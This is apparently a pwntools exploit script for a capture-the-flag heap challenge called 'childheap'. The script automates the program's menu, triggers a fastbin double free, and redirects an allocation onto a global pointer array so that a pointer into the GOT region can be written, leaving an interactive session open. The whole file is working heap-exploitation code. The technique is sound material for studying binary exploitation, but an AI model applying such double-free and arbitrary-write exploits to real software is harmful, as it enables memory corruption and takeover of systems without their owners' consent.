from pwn import *

def malloc(index, size,content):
	p.sendlineafter('> ','1')
	p.sendlineafter('index: ',str(index))
	p.sendlineafter('size: ',str(size))
	p.sendlineafter('content: ',str(content))		

def free(index):
	p.sendlineafter('> ','2')
        p.sendlineafter('index: ',str(index))

p = process('./childheap')
e = ELF("./childheap")
l = e.libc

for name,addr in e.got.items():
	log.info(name + ' : ' + hex(addr))

pause()
context.log_level = "debug"

size  = 0x7f - 24
malloc(0,size,1)
malloc(1,size,1)

free(0)
free(1)
free(0)

ptr = 0x6020C0

malloc(2,size,p64(ptr - 11 - 8))
malloc(3,size,1)
malloc(1,size, 1)

malloc(1,size,'a' * 3 + p64(0x602000))

p.interactive()
